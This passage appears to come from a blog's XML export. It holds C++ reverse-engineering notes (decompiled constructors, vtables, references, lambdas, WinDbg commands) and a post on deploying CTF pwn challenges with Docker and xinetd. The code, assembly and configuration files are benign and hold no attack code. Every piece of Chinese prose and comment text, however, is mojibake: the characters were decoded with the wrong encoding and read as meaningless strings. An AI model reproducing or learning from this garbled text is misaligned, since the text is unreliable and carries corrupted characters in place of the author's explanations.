<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">Boy::Boy</span><span class="params">(Boy *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Person::<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8;   <span class="comment">// è™šæŒ‡é’ˆ</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ææ„æ—¶ï¼Œææ„é¡ºåºä¸ºå…ˆææ„å­ç±»ï¼Œåææ„çˆ¶ç±»ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall Boy::~<span class="built_in">Boy</span>(Boy *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8; <span class="comment">// vfptr</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;~boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  Person::~<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è™šå‡½æ•°"><a href="#è™šå‡½æ•°" class="headerlink" title="è™šå‡½æ•°"></a>è™šå‡½æ•°</h3><p>è™šå‡½æ•°ä¹Ÿæ˜¯å‡½æ•°ï¼Œä½“ç°äº†CPPçš„å¤šæ€æ€§ã€‚</p>
<p>æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹æ¥è°ƒç”¨æˆå‘˜å‡½æ•°ï¼Œè€Œä¸æ˜¯æ ¹æ®æŒ‡é’ˆçš„ç±»å‹æ¥å¯¹è¯¥å—å†…å­˜è¿›è¡Œè§£é‡Šå¹¶è°ƒç”¨å±äºè¯¥æŒ‡é’ˆç±»å‹æ‰€å±çš„æˆå‘˜å‡½æ•°ï¼Œç®€åŒ–ä»£ç å®ç°å¤šæ€æ€§</p>
<ul>
<li>ä¸€ä¸ªå¾ˆå¥½çš„è§£é‡Šï¼šçˆ¶ç±»å£°æ˜å­ç±»<code>Set&lt;String&gt; m = new HashMap&lt;String&gt;</code>ï¼Œä½†æ˜¯è°ƒç”¨æ–¹æ³•æ˜¯å­ç±»çš„</li>
</ul>
<p>åœ¨<code>cpp</code>ä¸­ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆå’Œä¸€ä¸ªè¡¨æ ¼æ¥è¿›è¡Œå®ç°çš„ã€‚è¿™ä¸ªè¡¨æ ¼ç§°ä¸ºè™šè¡¨<code>vftable</code>Â ï¼Œè¿™ä¸ªæŒ‡é’ˆç§°ä¸ºè™šè¡¨æŒ‡é’ˆã€‚</p>
<ul>
<li>å¦‚æœä¸€ä¸ªç±»ä¸­æœ‰è™šå‡½æ•°ï¼Œç¼–è¯‘å™¨åˆ™ä¼šåœ¨å¯¹è±¡çš„é¦–éƒ¨åŠ å…¥è™šè¡¨æŒ‡é’ˆï¼Œä»¥å­˜æ”¾æ‰€å±äºè¯¥å¯¹è±¡çš„è™šè¡¨</li>
</ul>
<p>è™šè¡¨æŒ‡é’ˆçš„å¡«å……æ—¶æœºï¼š<strong>åªæœ‰åœ¨æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä¸­ä¼šå¯¹è™šè¡¨æŒ‡é’ˆé‡æ–°èµ‹å€¼ï¼Œå…¶ä»–ä½ç½®æ²¡æœ‰å¯¹è¯¥æŒ‡é’ˆçš„æ“ä½œ</strong>ã€‚</p>
<ul>
<li>è™šå‡½æ•°åœ¨ç±»çš„é¦–éƒ¨</li>
</ul>
<p>å…¶åœ¨æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ç»™<code>vfptr</code>èµ‹å€¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8 off_4CC8        dq offset _ZN3BoyD2Ev   ; DATA XREF: Boy::<span class="built_in">Boy</span>(<span class="type">void</span>)+<span class="number">1</span>Dâ†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()+<span class="number">10</span>â†‘o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD0                 dq offset _ZN3BoyD0Ev   ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD8                 dq offset _ZN3Boy6GetAgeEv ; Boy::<span class="built_in">GetAge</span>(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE0                 dq offset _ZN3Boy6SetAgeEi ; Boy::<span class="built_in">SetAge</span>(<span class="type">int</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE8                 <span class="keyword">public</span> _ZTV6Person ; weak</span><br></pre></td></tr></table></figure>

<p><strong>ææ„å‡½æ•°ä¸ºä»€ä¹ˆä¹Ÿè¦é‡æ–°ç»™è™šè¡¨èµ‹å€¼å‘¢ï¼Ÿ</strong></p>
<ul>
<li>ç¼–è¯‘å™¨æ— æ³•é¢„çŸ¥è¿™ä¸ªå­ç±»ä»¥åæ˜¯å¦ä¼šè¢«å…¶ä»–ç±»ç»§æ‰¿ï¼Œå¦‚æœè¢«ç»§æ‰¿ï¼Œå°±æˆäº†çˆ¶ç±»ï¼Œåœ¨æ‰§è¡Œææ„å‡½æ•°æ—¶ä¼šå…ˆæ‰§è¡Œå½“å‰å¯¹è±¡çš„ææ„å‡½æ•°ï¼Œç„¶åå‘ç¥–çˆ¶ç±»çš„æ–¹å‘æŒ‰ç»§æ‰¿çº¿è·¯é€å±‚è°ƒç”¨å„ç±»ææ„å‡½æ•°ï¼Œå½“å‰å¯¹è±¡çš„ææ„å‡½æ•°å¼€å§‹æ‰§è¡Œæ—¶ï¼Œå…¶è™šè¡¨ä¹Ÿæ˜¯å½“å‰å¯¹è±¡çš„ï¼Œæ‰€ä»¥æ‰§è¡Œåˆ°çˆ¶ç±»çš„ææ„å‡½æ•°æ—¶ï¼Œè™šè¡¨å¿…é¡»æ”¹å†™ä¸ºçˆ¶ç±»çš„è™šè¡¨</li>
</ul>
<h2 id="å¼•ç”¨ä¸æŒ‡é’ˆ"><a href="#å¼•ç”¨ä¸æŒ‡é’ˆ" class="headerlink" title="å¼•ç”¨ä¸æŒ‡é’ˆ"></a>å¼•ç”¨ä¸æŒ‡é’ˆ</h2><p>æŒ‡é’ˆ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> *p = &amp;a;</span><br><span class="line">    *p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax  </span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax  ; *p</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>

<p>å·¦å€¼å¼•ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> &amp;p = a;</span><br><span class="line">    p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>

<p>æŒ‡é’ˆå’Œå·¦å€¼å¼•ç”¨ï¼šåœ¨æ±‡ç¼–çœ‹èµ·æ¥ä¸€æ¨¡ä¸€æ ·ï¼Œå¼•ç”¨ä¹Ÿæ˜¯ä¸ºäº†æ»¡è¶³C++ç‰¹æ€§ï¼Œæ¯”å¦‚æ“ä½œç¬¦é‡è½½</p>
<p>å³å€¼å¼•ç”¨ï¼Ÿï¼Ÿï¼Ÿ</p>
<ul>
<li>å‡½æ•°å‚æ•°å³å€¼å¼•ç”¨å’Œå€¼ä¼ é€’ä½œä¸ºå‚æ•°</li>
</ul>
<h2 id="lambda-è¡¨è¾¾å¼"><a href="#lambda-è¡¨è¾¾å¼" class="headerlink" title="lambda è¡¨è¾¾å¼"></a>lambda è¡¨è¾¾å¼</h2><p>æ¯”è¾ƒç®€å•çš„lambda å¯ä»¥çœ‹å‡ºæ¥å…¶å‚æ•°ç±»å‹ä¸ä¸ªæ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v3 = main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(&amp;v6, <span class="number">1LL</span>, <span class="number">2LL</span>);</span><br><span class="line"> </span><br><span class="line">__int64 __fastcall main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;lambda&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a2 + a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>WinDbg å‘½ä»¤ï¼š<a href="http://windbg.info/doc/1-common-cmds.html">Common WinDbg Commands </a><br>x64dbg æ–‡æ¡£ï¼š<a href="https://help.x64dbg.com/en/latest/">  x64dbg documentation</a> </p>
<p>windbg å¸¸è§å‘½ä»¤ï¼Œæ„Ÿè§‰ preview æ›´åŠ å¥½çœ‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–­ç‚¹ b</span></span><br><span class="line">bp: æ–­ç‚¹</span><br><span class="line">bl: list</span><br><span class="line">bc: clear</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹ display/dump</span></span><br><span class="line">d&#123;a|b|c|d|D|f|p|q|u|w|W&#125; [Options] [Range]</span><br><span class="line">db: dump byte</span><br><span class="line">dw: word</span><br><span class="line">dd: dword</span><br><span class="line">dq: qword</span><br><span class="line">dt: type</span><br><span class="line"></span><br><span class="line"><span class="comment">// å•æ­¥æ‰§è¡Œ</span></span><br><span class="line">g: go</span><br><span class="line">t: traceï¼Œæ­¥å…¥</span><br><span class="line">p: æ­¥è¿‡</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹å¯„å­˜å™¨</span></span><br><span class="line">r: <span class="keyword">register</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨æ ˆ</span></span><br><span class="line">k: dump stack</span><br><span class="line">.frame</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢</span></span><br><span class="line">s: search</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹</span></span><br><span class="line">e: edit</span><br></pre></td></tr></table></figure>

<p>æŸäº›å‘½ä»¤</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.echo </span><br><span class="line">.reboot</span><br><span class="line">.reload</span><br><span class="line">.cls: æ¸…å±å¹•</span><br><span class="line">.help</span><br></pre></td></tr></table></figure>


<p>x64dbg æ“ä½œèµ·æ¥æ¯”è¾ƒå®¹æ˜“ï¼Œå¯ä»¥ä½¿ç”¨é¼ æ ‡å’Œå³é”®ğŸ˜‹ã€‚é™¤äº†æŸäº›å‘½ä»¤</p>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFå‡ºé¢˜</title>
    <url>/2023/09/16/CTF%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>æ€ä¹ˆå‡ºé¢˜éƒ¨ç½²ç¯å¢ƒï¼Ÿ</p>
</blockquote>
<span id="more"></span>

<h3 id="dockeréƒ¨ç½²"><a href="#dockeréƒ¨ç½²" class="headerlink" title="dockeréƒ¨ç½²"></a>dockeréƒ¨ç½²</h3><ol>
<li>é¦–å…ˆè‚¯å®šæ˜¯å®‰è£…docker</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>å†™é¢˜ç›®</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall</span><br><span class="line">â”œâ”€â”€ flag.txt</span><br><span class="line">â”œâ”€â”€ vuln</span><br><span class="line">â”œâ”€â”€ vuln.c</span><br><span class="line">â””â”€â”€ Makefile</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>docker éƒ¨ç½²ï¼Œåœ¨åŒçº§ç›®å½•æ·»åŠ  Dockerfileï¼ŒåŒæ—¶é…åˆ xinetd<ul>
<li>ä¿®æ”¹æ–‡ä»¶ä¸­å†…å®¹ï¼Œçœ‹æ³¨é‡Š</li>
</ul>
</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>docker-compose.yml<ul>
<li>è‡ªå·±æ›´æ”¹ç«¯å£å°±è¡Œ</li>
</ul>
</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p><strong>å‘ç‚¹</strong>ï¼šdockeréƒ¨ç½²é¢˜ç›®æ—¶ï¼Œåœ¨ç¨‹åºé‡Œå¿…é¡»å°†ç¼“å†²å™¨ç½®ä¸º0ï¼Œå¦åˆ™ä¸ä¼šæ˜¾ç¤ºï¼Ÿ</p>
<h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><p>ä¸‹è½½è¿™ä¸ªé“¾æ¥ <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>ï¼Œéƒ¨ç½²æ¯”è¾ƒç®€å•ã€‚</p>
<ul>
<li>ä¿®æ”¹ binç›®å½• é‡Œçš„ äºŒè¿›åˆ¶æ–‡ä»¶å’Œ flag æ–‡ä»¶</li>
<li>dockerfile ä¿®æ”¹ä¸€è¡Œ</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¹ä¸º</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure>

<p>ctf.xinetd ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹</span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf è‡ªå·±çš„æ¼æ´ç¨‹åº</span><br></pre></td></tr></table></figure>

<p>æœ€åæ‰§è¡ŒREADME é‡Œçš„ ä¸¤æ¡å‘½ä»¤å°±è¡Œï¼Œæ¯”å¦‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†pub_port è‡ªå·±æƒ³è¦çš„ç«¯å£</span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure>


<p>æŸ¥çœ‹äº†ä¸€çœ¼å…¶å†…å®¹ï¼Œä½¿ç”¨ chrootæ²™ç›’ï¼Œå°†æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•è½¬åŒ–ä¸ºåŸå…ˆçš„ <code>/home/ctf</code> ç›®å½•ï¼Œæ‰€ä»¥è¦åœ¨dockerfileä¸­å°†libå…¨éƒ¨æ‹·è´ä¸€ä»½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure>

<h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul>
<li>éƒ¨ç½²å¤šé“ctfé¢˜ç›®ï¼š <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a>ï¼Œ<a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/">æ•™ç¨‹</a> å†™çš„å¾ˆè¯¦ç»†ã€‚ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆå®¹æ˜“</li>
</ul>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul>
<li>å†…æ ¸é¢˜ç›®éƒ¨ç½²ï¼Œä½¿ç”¨ ctf_xinetd ä¸¾ä¾‹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall  </span><br><span class="line">â”œâ”€â”€ ctf.xinetd  </span><br><span class="line">â”œâ”€â”€ Dockerfile  </span><br><span class="line">â”œâ”€â”€ bin  </span><br><span class="line">â”‚ â”œâ”€â”€ run.sh  </span><br><span class="line">â”‚ â”œâ”€â”€ bzImage  </span><br><span class="line">â”‚ â””â”€â”€ rootfs.cpio  </span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ start.sh </span><br></pre></td></tr></table></figure>

<p>docker å®‰è£…ç¯å¢ƒ</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">	apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">	apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">	libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure>

<p>é‡è¦çš„æ˜¯ä¿®æ”¹ ctf.xinetd  æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># ä¿®æ”¹å¤„</span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Cmakeä½¿ç”¨</title>
